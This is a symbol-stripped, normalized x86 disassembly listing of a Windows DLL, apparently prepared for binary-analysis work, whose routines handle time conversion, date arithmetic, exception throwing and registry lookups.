adc eax [ ebx + 0x4 ]
mov [ esi ] edi
jmp r-xdata
mov eax ebx
call sub_1000e1e8
test al al
je r-xdata
cmp edi 0xffffffff
je r-xdata
mov [ esi + 0x4 ] eax
jmp r-xdata
cmp edi 0xffffffff
jne r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov eax esi
pop edi
pop ecx
retn 0x4
test edi edi
jne r-xdata
or [ esi ] edi
jmp r-xdata
and [ esi ] edi
mov [ esi + 0x4 ] 0x80000000
jmp r-xdata
mov [ esi + 0x4 ] 0x7fffffff
sub_1000e2b9
push ebp
mov ebp esp
and [ edi + 0x4 ] 0x0
sub esp 0x18
push ebx
mov [ edi ] 0x1
mov ebx [ eax ]
push esi
mov esi ecx
test ebx ebx
je r-xdata
mov eax [ esi ]
mov [ ebp - 0x10 ] eax
mov eax [ esi + 0x4 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] ebx
push eax
lea esi [ ebp - 0x18 ]
lea ebx [ ebp - 0x10 ]
call sub_1000e20b
mov ecx [ eax ]
mov [ edi ] ecx
mov eax [ eax + 0x4 ]
mov [ edi + 0x4 ] eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xfffffffe
je r-xdata
push esi
call sub_1000e183
test al al
jne r-xdata
mov eax [ esi ]
mov esi [ esi + 0x4 ]
push 0x14
push 0x1dd76000
push 0x0
push ebx
mov [ ebp - 0x10 ] eax
call sub_1002b270
add eax [ ebp - 0x10 ]
adc edx esi
mov [ edi ] eax
mov [ edi + 0x4 ] edx
jmp r-xdata
pop esi
mov eax edi
pop ebx
leave
retn
sub_1000e337
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x10 ]
mov ebx ecx
xor ecx ecx
cmp eax ecx
push edi
mov edi [ ebp + 0xc ]
jl r-xdata
neg eax
cmp ebx ecx
jl r-xdata
cmp [ ebp + 0x8 ] ecx
jge r-xdata
neg ebx
cmp [ ebp + 0x8 ] ecx
jl r-xdata
cmp esi ecx
jg r-xdata
neg [ ebp + 0x8 ]
cmp ebx ecx
jge r-xdata
cmp esi ecx
jl r-xdata
push ecx
cdq
push 0x3c
push edx
push eax
call sub_1002b270
mov ecx eax
mov eax edx
mov [ ebp - 0x4 ] eax
mov eax ebx
cdq
add ecx eax
mov eax [ ebp - 0x4 ]
push 0x0
push 0x3c
adc eax edx
push eax
push ecx
call sub_1002b270
mov ecx eax
mov eax [ ebp + 0x8 ]
mov ebx edx
cdq
push 0x0
add ecx eax
push 0xf4240
adc ebx edx
push ebx
push ecx
call sub_1002b270
neg edi
adc esi 0x0
neg esi
sub edi eax
sbb esi edx
mov eax edi
mov edx esi
jl r-xdata
jg r-xdata
neg edi
adc esi ecx
neg esi
cmp edi ecx
jae r-xdata
push ecx
cdq
push 0x3c
push edx
push eax
call sub_1002b270
mov ecx eax
mov eax edx
mov [ ebp - 0x4 ] eax
mov eax ebx
cdq
add ecx eax
mov eax [ ebp - 0x4 ]
push 0x0
push 0x3c
adc eax edx
push eax
push ecx
call sub_1002b270
mov ecx eax
mov eax [ ebp + 0x8 ]
mov ebx edx
cdq
push 0x0
add ecx eax
push 0xf4240
adc ebx edx
push ebx
push ecx
call sub_1002b270
add eax edi
adc edx esi
jmp r-xdata
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_1000e41b
push 0x4
mov eax sub_1004d578
call sub_10028203
mov edi ecx
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
push edi
mov ecx esi
call sub_1000e5cd
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x3c ] r--data
mov [ ebp - 0x4 ] 0x1
lea ebx [ esi + 0x28 ]
mov [ esi ] r--data
mov [ ebx ] r--data
mov [ esi + 0x3c ] r--data
test edi edi
je r-xdata
xor edi edi
add edi 0x28
jmp r-xdata
call sub_1000e9e6
mov eax esi
call sub_100282db
retn
sub_1000e475
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_1000e614
mov [ esi + 0x28 ] r--data
and [ esi + 0x2c ] 0x0
and [ esi + 0x30 ] 0x0
and [ esi + 0x34 ] 0x0
or [ esi + 0x38 ] 0xffffffff
mov [ esi ] r--data
mov [ esi + 0x28 ] r--data
mov eax esi
leave
retn
sub_1000e4f6
push 0x4
mov eax sub_1004e6f6
call sub_10028203
mov esi ecx
push 0x40
call sub_10024389
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
add esi 0xffffffc4
push esi
call sub_1000e57c
jmp r-xdata
xor eax eax
add eax 0x3c
jmp r-xdata
test eax eax
je r-xdata
call sub_100282db
retn
sub_1000e5cd
push 0x4
mov eax sub_1004cfc3
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
mov edi [ ebp + 0x8 ]
push edi
call sub_1000e614
xor eax eax
mov [ ebp - 0x4 ] eax
cmp edi eax
je r-xdata
lea edi [ esi + 0x28 ]
push eax
mov ecx edi
call sub_1000ecc3
mov [ esi ] r--data
mov [ edi ] r--data
mov eax esi
call sub_100282db
retn 0x4
lea eax [ edi + 0x28 ]
sub_1000e62c
push 0xc4
mov eax sub_1004e39a
call sub_10028203
push r--data
lea ecx [ ebp - 0x54 ]
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
push eax
lea ecx [ ebp - 0x38 ]
call sub_1000ed61
xor esi esi
push 0x0
inc esi
push esi
lea ecx [ ebp - 0x54 ]
call sub_10002020
mov [ ebp - 0x38 ] r--data
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x4 ] esi
push eax
lea esi [ ebp - 0xd0 ]
call sub_1000e475
pop ecx
lea ecx [ ebp - 0x94 ]
push ecx
mov ecx eax
mov [ ebp - 0x4 ] 0x2
call sub_1000e41b
lea eax [ ebp - 0x94 ]
mov [ esp ] r--data
push eax
call sub_10027dd1
int3
sub_1000e6a3
push ecx
mov edx 0x578
mov [ eax ] dx
movzx edx cx
inc edx
cmp edx 0x579
jge r-xdata
mov edx 0x2710
cmp cx dx
ja r-xdata
call sub_1000e62c
mov [ eax ] cx
pop ecx
retn
sub_1000e6cc
push 0x4
mov eax sub_1004d54a
call sub_10028203
mov edi ecx
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
push edi
mov ecx esi
call sub_1000e87e
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x3c ] r--data
mov [ ebp - 0x4 ] 0x1
lea ebx [ esi + 0x28 ]
mov [ esi ] r--data
mov [ ebx ] r--data
mov [ esi + 0x3c ] r--data
test edi edi
je r-xdata
xor edi edi
add edi 0x28
jmp r-xdata
call sub_1000e9e6
mov eax esi
call sub_100282db
retn
sub_1000e726
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_1000e8c5
mov [ esi + 0x28 ] r--data
and [ esi + 0x2c ] 0x0
and [ esi + 0x30 ] 0x0
and [ esi + 0x34 ] 0x0
or [ esi + 0x38 ] 0xffffffff
mov [ esi ] r--data
mov [ esi + 0x28 ] r--data
mov eax esi
leave
retn
sub_1000e7a7
push 0x4
mov eax sub_1004e6f6
call sub_10028203
mov esi ecx
push 0x40
call sub_10024389
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
add esi 0xffffffc4
push esi
call sub_1000e82d
jmp r-xdata
xor eax eax
add eax 0x3c
jmp r-xdata
test eax eax
je r-xdata
call sub_100282db
retn
sub_1000e87e
push 0x4
mov eax sub_1004cfc3
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
mov edi [ ebp + 0x8 ]
push edi
call sub_1000e8c5
xor eax eax
mov [ ebp - 0x4 ] eax
cmp edi eax
je r-xdata
lea edi [ esi + 0x28 ]
push eax
mov ecx edi
call sub_1000ecc3
mov [ esi ] r--data
mov [ edi ] r--data
mov eax esi
call sub_100282db
retn 0x4
lea eax [ edi + 0x28 ]
sub_1000e8ff
push 0xc4
mov eax sub_1004e361
call sub_10028203
push r--data
lea ecx [ ebp - 0x54 ]
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
push eax
lea ecx [ ebp - 0x38 ]
call sub_1000ed61
xor esi esi
push 0x0
inc esi
push esi
lea ecx [ ebp - 0x54 ]
call sub_10002020
mov [ ebp - 0x38 ] r--data
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x4 ] esi
push eax
lea esi [ ebp - 0xd0 ]
call sub_1000e726
pop ecx
lea ecx [ ebp - 0x94 ]
push ecx
mov ecx eax
mov [ ebp - 0x4 ] 0x2
call sub_1000e6cc
lea eax [ ebp - 0x94 ]
mov [ esp ] r--data
push eax
call sub_10027dd1
int3
sub_1000e976
push 0x44
mov eax sub_1004ddb1
call sub_10028203
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
push eax
lea ecx [ ebp - 0x50 ]
call sub_1000ed61
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_10002020
mov [ ebp - 0x50 ] r--data
lea eax [ ebp - 0x50 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1000ed21
sub_1000e9c0
mov ecx [ esi ]
push edi
mov edi [ eax ]
test ecx ecx
je r-xdata
mov [ esi ] edi
test edi edi
je r-xdata
mov eax [ ecx ]
call [ eax + 0x10 ]
test al al
je r-xdata
mov eax esi
pop edi
retn
mov eax [ edi ]
mov ecx edi
call [ eax + 0xc ]
and [ esi ] 0x0
sub_1000e9e6
push 0x8
mov eax sub_1004cb01
call sub_10028203
and [ ebp - 0x10 ] 0x0
and [ ebp - 0x4 ] 0x0
mov ecx [ edi + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
mov eax [ edi + 0x10 ]
mov [ ebx + 0x10 ] eax
mov eax [ edi + 0x8 ]
mov [ ebx + 0x8 ] eax
lea esi [ ebx + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_1000e9c0
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x10 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
lea edx [ ebp - 0x14 ]
push edx
call [ eax + 0x14 ]
lea esi [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x1
call sub_1000e9c0
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x14 ]
test ecx ecx
je r-xdata
call sub_100282db
retn
mov eax [ ecx ]
call [ eax + 0x10 ]
mov eax [ ecx ]
call [ eax + 0x10 ]
test al al
je r-xdata
and [ ebp - 0x14 ] 0x0
sub_1000ea61
push 0x4
mov eax sub_1004d51c
call sub_10028203
mov edi ecx
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
push edi
mov ecx esi
call sub_1000ec39
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x3c ] r--data
mov [ ebp - 0x4 ] 0x1
lea ebx [ esi + 0x28 ]
mov [ esi ] r--data
mov [ ebx ] r--data
mov [ esi + 0x3c ] r--data
test edi edi
je r-xdata
xor edi edi
add edi 0x28
jmp r-xdata
call sub_1000e9e6
mov eax esi
call sub_100282db
retn
sub_1000eabb
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_1000ec80
mov [ esi + 0x28 ] r--data
and [ esi + 0x2c ] 0x0
and [ esi + 0x30 ] 0x0
and [ esi + 0x34 ] 0x0
or [ esi + 0x38 ] 0xffffffff
mov [ esi ] r--data
mov [ esi + 0x28 ] r--data
mov eax esi
leave
retn
sub_1000eb43
push 0x4
mov eax sub_1004e6f6
call sub_10028203
mov esi ecx
push 0x40
call sub_10024389
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
add esi 0xffffffc4
push esi
call sub_1000ebc9
jmp r-xdata
xor eax eax
add eax 0x3c
jmp r-xdata
test eax eax
je r-xdata
call sub_100282db
retn
sub_1000ebf6
push esi
mov esi ecx
mov [ esi ] r--data
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
pop esi
retn
mov eax [ ecx ]
call [ eax + 0x10 ]
test al al
je r-xdata
and [ esi + 0x4 ] 0x0
sub_1000ec39
push 0x4
mov eax sub_1004cfc3
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
mov edi [ ebp + 0x8 ]
push edi
call sub_1000ec80
xor eax eax
mov [ ebp - 0x4 ] eax
cmp edi eax
je r-xdata
lea edi [ esi + 0x28 ]
push eax
mov ecx edi
call sub_1000ecc3
mov [ esi ] r--data
mov [ edi ] r--data
mov eax esi
call sub_100282db
retn 0x4
lea eax [ edi + 0x28 ]
sub_1000ecc3
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
mov [ esi ] r--data
mov ecx [ edi + 0x4 ]
mov [ esi + 0x4 ] ecx
test ecx ecx
je r-xdata
mov eax [ edi + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ edi + 0x10 ]
mov [ esi + 0x10 ] eax
pop edi
mov eax esi
pop esi
retn 0x4
mov eax [ ecx ]
call [ eax + 0xc ]
sub_1000ed21
push 0x80
mov eax sub_1004dd83
call sub_10028203
push [ ebp + 0x8 ]
lea esi [ ebp - 0x4c ]
call sub_1000eabb
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x8c ]
push ecx
mov ecx eax
call sub_1000ea61
pop ecx
pop ecx
push r--data
lea eax [ ebp - 0x8c ]
push eax
call sub_10027dd1
int3
sub_1000ed84
push 0x44
mov eax sub_1004e32b
call sub_10028203
movzx esi [ ebp + 0x10 ]
push 0xe
pop eax
sub eax esi
cdq
push 0xc
pop ecx
idiv ecx
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
push 0x5
pop edi
mov ebx 0x190
push 0x64
movzx eax ax
sub ecx eax
imul eax eax 0xc
lea eax [ eax + edx - 0x3 ]
movzx eax ax
movzx eax ax
imul eax eax 0x99
add ecx 0x12c0
inc eax
inc eax
cdq
idiv edi
movzx ecx cx
movzx ecx cx
mov edi eax
mov eax ecx
cdq
idiv ebx
pop ebx
push 0x2
add edi eax
mov eax ecx
cdq
idiv ebx
sub edi eax
mov eax ecx
imul eax eax 0x16d
add edi eax
movzx eax [ ebp + 0x14 ]
shr ecx 0x2
add edi ecx
mov ecx [ ebp + 0x8 ]
lea eax [ edi + eax - 0x7d2d ]
mov [ ecx ] eax
pop eax
sub esi eax
je r-xdata
movzx esi [ ebp + 0xc ]
mov eax esi
and eax 0x80000003
jns r-xdata
sub esi eax
je r-xdata
jne r-xdata
dec eax
or eax 0xfffffffc
inc eax
push 0x1e
jmp r-xdata
sub esi eax
je r-xdata
push 0x1c
mov eax esi
push 0x64
cdq
pop edi
idiv edi
test edx edx
jne r-xdata
pop eax
cmp ax [ ebp + 0x14 ]
jae r-xdata
sub esi 0x3
je r-xdata
mov eax ecx
call sub_100282db
retn 0x10
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
push eax
lea ecx [ ebp - 0x50 ]
call sub_1000ed61
mov [ ebp - 0x50 ] r--data
lea eax [ ebp - 0x50 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1000ed21
push 0x1d
jmp r-xdata
mov eax esi
cdq
mov esi 0x190
idiv esi
test edx edx
jne r-xdata
sub esi eax
je r-xdata
push 0x1f
jmp r-xdata
sub_1000ee9b
push 0xc0
mov eax sub_1004f6ac
call sub_100282a2
mov eax [ ebp + 0x8 ]
and [ ebp - 0x30 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0xcc ]
push eax
mov ebx ecx
call sub_1000286f
lea eax [ ebp - 0x44 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10016fb8
mov esi eax
lea edi [ ebp - 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
movsd [ edi ] [ esi ]
push [ ebp - 0x28 ]
lea eax [ ebp - 0xc4 ]
push eax
call sub_1000dc3d
push [ ebp - 0x24 ]
push eax
call sub_1000fe17
push [ ebp - 0x22 ]
push eax
call sub_1000fe17
lea ecx [ ebp - 0x20 ]
push ecx
push eax
call sub_1000ff09
push r--data
push eax
call sub_10004afa
pop ecx
pop ecx
push ebx
push eax
call sub_10004da9
pop ecx
pop ecx
mov ecx [ ebp - 0x2c ]
lea eax [ ebp - 0xcc ]
call sub_1000299e
lea eax [ ebp - 0xcc ]
mov [ ebp - 0x4 ] 0x0
call sub_1000219b
mov eax [ ebp - 0x2c ]
call sub_100282fe
retn
sub_1000ef57
push 0xb8
mov eax sub_1004dd53
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov ebx r--data
xor esi esi
push ebx
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x34 ] esi
call sub_1000134a
mov edi r--data
push edi
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x4 ] esi
call sub_1000134a
lea eax [ ebp - 0xa4 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea edx [ ebp - 0x50 ]
mov ecx 0x80000002
mov [ ebp - 0x4 ] 0x1
call sub_1000fb90
pop ecx
pop ecx
push esi
push 0x1
lea ecx [ ebp - 0x50 ]
call sub_10001500
push esi
push 0x1
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x4
call sub_10001500
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10010da6
test eax eax
jne r-xdata
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10010da6
mov ecx [ ebp - 0x30 ]
test eax eax
je r-xdata
push ebx
lea ecx [ ebp - 0x88 ]
call sub_1000134a
push edi
lea ecx [ ebp - 0x6c ]
mov [ ebp - 0x4 ] 0x5
call sub_1000134a
lea eax [ ebp - 0x88 ]
push eax
lea eax [ ebp - 0xc0 ]
push eax
lea edx [ ebp - 0x6c ]
mov ecx 0x80000001
mov [ ebp - 0x4 ] 0x6
call sub_1000fb90
pop ecx
pop ecx
push 0xffffffff
push esi
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x7
call sub_10001450
push esi
push 0x1
lea ecx [ ebp - 0xc0 ]
call sub_10001500
push esi
push 0x1
lea ecx [ ebp - 0x6c ]
call sub_10001500
push esi
push 0x1
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x4 ] 0x4
call sub_10001500
push r--data
call sub_1000134a
lea eax [ ebp - 0x2c ]
push eax
call sub_1000136c
jmp r-xdata
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10001500
mov eax [ ebp - 0x30 ]
call sub_100282ef
retn
sub_1000f091
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004f934
mov eax [ fs : 0x0 ]
push eax
sub esp 0x80
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x78 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x90 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
push ebx
lea ecx [ esp + 0x70 ]
mov [ esp + 0x18 ] eax
mov [ esp + 0x16 ] bl
mov [ esp + 0x88 ] 0x7
call sub_100016a9
mov edi r--data
push edi
lea ecx [ esp + 0x38 ]
mov [ esp + 0x9c ] ebx
call sub_1000134a
mov esi r--data
push esi
lea ecx [ esp + 0x1c ]
mov [ esp + 0x9c ] 0x1
call sub_1000134a
lea eax [ esp + 0x34 ]
push eax
lea eax [ esp + 0x54 ]
push eax
lea edx [ esp + 0x20 ]
mov ecx 0x80000002
mov [ esp + 0xa0 ] 0x2
call sub_1000fb90
pop ecx
pop ecx
push 0xffffffff
push ebx
push eax
lea ecx [ esp + 0x78 ]
mov [ esp + 0xa4 ] 0x3
call sub_10001450
push ebx
push 0x1
lea ecx [ esp + 0x58 ]
call sub_10001500
push ebx
push 0x1
lea ecx [ esp + 0x20 ]
call sub_10001500
push ebx
push 0x1
lea ecx [ esp + 0x3c ]
mov [ esp + 0xa0 ] bl
call sub_10001500
push r--data
lea ecx [ esp + 0x70 ]
call sub_10010da6
test eax eax
jne r-xdata
push ebx
push 0x1
lea ecx [ esp + 0x74 ]
call sub_10001500
mov ecx [ esp + 0x90 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x78 ]
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn
push edi
lea ecx [ esp + 0x1c ]
call sub_1000134a
push esi
lea ecx [ esp + 0x38 ]
mov [ esp + 0x9c ] 0x4
call sub_1000134a
lea eax [ esp + 0x18 ]
push eax
lea eax [ esp + 0x54 ]
push eax
lea edx [ esp + 0x3c ]
mov ecx 0x80000001
mov [ esp + 0xa0 ] 0x5
call sub_1000fb90
pop ecx
pop ecx
push 0xffffffff
push ebx
push eax
lea ecx [ esp + 0x78 ]
mov [ esp + 0xa4 ] 0x6
call sub_10001450
push ebx
push 0x1
lea ecx [ esp + 0x58 ]
call sub_10001500
push ebx
push 0x1
lea ecx [ esp + 0x3c ]
call sub_10001500
push ebx
push 0x1
lea ecx [ esp + 0x20 ]
mov [ esp + 0xa0 ] bl
call sub_10001500
push r--data
lea ecx [ esp + 0x70 ]
call sub_10010da6
test eax eax
je r-xdata
mov ecx [ esp + 0x14 ]
lea eax [ esp + 0x50 ]
push eax
call sub_1000ee9b
pop ecx
push 0xffffffff
push ebx
push eax
lea ecx [ esp + 0x78 ]
mov [ esp + 0xa4 ] 0x7
call sub_10001450
push ebx
push 0x1
lea ecx [ esp + 0x58 ]
mov [ esp + 0xa0 ] bl
call sub_10001500
mov [ esp + 0x12 ] 0x1
jmp r-xdata
cmp [ esp + 0x12 ] 0x1
je r-xdata
push edi
lea ecx [ esp + 0x1c ]
call sub_1000134a
push esi
lea ecx [ esp + 0x38 ]
mov [ esp + 0x9c ] 0x8
call sub_1000134a
lea eax [ esp + 0x6c ]
push eax
lea eax [ esp + 0x1c ]
push eax
lea edx [ esp + 0x3c ]
mov ecx 0x80000002
mov [ esp + 0xa0 ] 0x9
call sub_1000fc8b
pop ecx
pop ecx
push ebx
push 0x1
lea ecx [ esp + 0x3c ]
mov [ esp + 0x1b ] al
call sub_10001500
push ebx
push 0x1
lea ecx [ esp + 0x20 ]
mov [ esp + 0xa0 ] bl
call sub_10001500
cmp [ esp + 0x13 ] 0x1
je r-xdata
push edi
lea ecx [ esp + 0x1c ]
call sub_1000134a
push esi
lea ecx [ esp + 0x38 ]
mov [ esp + 0x9c ] 0xa
call sub_1000134a
lea eax [ esp + 0x6c ]
push eax
lea eax [ esp + 0x1c ]
push eax
lea edx [ esp + 0x3c ]
mov ecx 0x80000001
mov [ esp + 0xa0 ] 0xb
call sub_1000fc8b
pop ecx
pop ecx
push ebx
push 0x1
lea ecx [ esp + 0x3c ]
call sub_10001500
push ebx
push 0x1
lea ecx [ esp + 0x20 ]
call sub_10001500
sub_1000f355
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004ef46
mov eax [ fs : 0x0 ]
push eax
sub esp 0x140
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x138 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x150 ]
mov [ fs : 0x0 ] eax
lea eax [ esp + 0x4c ]
push eax
mov ebx ecx
mov esi edx
call sub_1000286f
push r--data
push ecx
push r--data
push ecx
push ebx
push ecx
lea eax [ esp + 0x6c ]
push r--data
xor edi edi
push eax
mov [ esp + 0x178 ] edi
call sub_10004afa
push eax
call sub_10004c53
add esp 0x10
push eax
call sub_10004da9
push eax
call sub_10004c53
add esp 0x10
push eax
call sub_10004afa
add esp 0xc
push eax
call sub_10004afa
pop ecx
pop ecx
lea ecx [ esp + 0xf4 ]
lea eax [ esp + 0x4c ]
call sub_1000299e
push r--data
lea ecx [ esp + 0xdc ]
mov [ esp + 0x15c ] 0x1
call sub_1000134a
push r--data
mov ecx esi
mov [ esp + 0x15c ] 0x2
call sub_10010da6
test eax eax
je r-xdata
mov esi r--data
push esi
lea ecx [ esp + 0x34 ]
call sub_1000134a
lea eax [ esp + 0xd8 ]
push eax
lea eax [ esp + 0x114 ]
mov ebx 0x80000002
push eax
lea edx [ esp + 0x38 ]
mov ecx ebx
mov [ esp + 0x160 ] 0x3
call sub_1000fb90
pop ecx
pop ecx
push edi
push 0x1
lea ecx [ esp + 0x38 ]
mov [ esp + 0x160 ] 0x5
call sub_10001500
lea eax [ esp + 0xf4 ]
lea ecx [ esp + 0x110 ]
call sub_10003270
test al al
jne r-xdata
push 0xffffffff
push edi
push esi
lea ecx [ esp + 0xe4 ]
call sub_10001450
push esi
lea ecx [ esp + 0x18 ]
call sub_1000134a
lea eax [ esp + 0xd8 ]
push eax
lea eax [ esp + 0x130 ]
mov ebx 0x80000001
push eax
lea edx [ esp + 0x1c ]
mov ecx ebx
mov [ esp + 0x160 ] 0x7
call sub_1000fb90
pop ecx
pop ecx
push edi
push 0x1
lea ecx [ esp + 0x1c ]
mov [ esp + 0x160 ] 0x9
call sub_10001500
lea eax [ esp + 0xf4 ]
lea ecx [ esp + 0x12c ]
call sub_10003270
test al al
jne r-xdata
push esi
lea ecx [ esp + 0x18 ]
call sub_1000134a
lea eax [ esp + 0xf4 ]
push eax
lea eax [ esp + 0xdc ]
push eax
lea edx [ esp + 0x1c ]
mov ecx ebx
mov [ esp + 0x160 ] 0x6
call sub_1000fc8b
pop ecx
pop ecx
push edi
push 0x1
lea ecx [ esp + 0x1c ]
mov [ esp + 0x160 ] 0x5
call sub_10001500
xor esi esi
push edi
inc esi
push esi
lea ecx [ esp + 0x134 ]
call sub_10001500
push edi
push esi
lea ecx [ esp + 0x118 ]
call sub_10001500
push edi
push esi
lea ecx [ esp + 0xe0 ]
call sub_10001500
push edi
push esi
lea ecx [ esp + 0xfc ]
call sub_10001500
or [ esp + 0x158 ] 0xffffffff
lea eax [ esp + 0x4c ]
call sub_1000219b
mov ecx [ esp + 0x150 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x138 ]
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn
push esi
lea ecx [ esp + 0x34 ]
call sub_1000134a
lea eax [ esp + 0xf4 ]
push eax
lea eax [ esp + 0xdc ]
push eax
lea edx [ esp + 0x38 ]
mov ecx ebx
mov [ esp + 0x160 ] 0xa
call sub_1000fc8b
pop ecx
pop ecx
push edi
push 0x1
lea ecx [ esp + 0x38 ]
call sub_10001500
sub_1000f5f4
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004f679
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x58 ] eax
push ebx
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x68 ]
mov [ fs : 0x0 ] eax
push r--data
lea ecx [ esp + 0x10 ]
call sub_1000134a
and [ esp + 0x70 ] 0x0
lea eax [ esp + 0x28 ]
push eax
lea ebx [ esp + 0x10 ]
call sub_10015ec7
mov [ esp + 0x74 ] 0x1
mov [ esp ] r--data
push eax
lea eax [ esp + 0x4c ]
push eax
call sub_10004ab3
add esp 0xc
push 0x0
push 0x1
lea ecx [ esp + 0x30 ]
call sub_10001500
push 0x0
push 0x1
mov ecx ebx
mov [ esp + 0x78 ] 0x4
call sub_10001500
lea eax [ esp + 0x44 ]
push eax
call sub_1000f9b0
pop ecx
cmp eax 0x2b
jne r-xdata
jbe r-xdata
xor bl bl
lea eax [ esp + 0x44 ]
push eax
call sub_1000faa9
pop ecx
jmp r-xdata
mov bl 0x1
jmp r-xdata
push 0x0
push 0x1
lea ecx [ esp + 0x4c ]
call sub_10001500
mov al bl
mov ecx [ esp + 0x68 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebx
mov ecx [ esp + 0x58 ]
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn
sub_1000f6d1
push 0x8
mov eax sub_1004e300
call sub_10028236
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_10003270
test al al
je r-xdata
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10015e58
pop ecx
jmp r-xdata
mov al 0x1
jmp r-xdata
call sub_100282db
retn
sub_1000f725
push ebp
sub esp 0xc4
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0xc4 ] eax
push 0x58
mov eax sub_1004e7cf
call sub_10028203
mov ebx ecx
xor esi esi
push r--data
lea ecx [ ebp + 0x70 ]
mov [ ebp - 0x2c ] esi
call sub_1000134a
push r--data
mov ecx ebx
mov [ ebp - 0x4 ] esi
call sub_10010da6
test eax eax
je r-xdata
push __dos_header
lea ebx [ ebp + 0xa8 ]
call sub_100158ec
lea eax [ ebp + 0x70 ]
push eax
xor ebx ebx
lea eax [ ebp - 0x28 ]
push r--data
inc ebx
push eax
mov [ ebp - 0x4 ] bl
call sub_10010c73
push r--data
push eax
lea eax [ ebp + 0x8c ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10004ab3
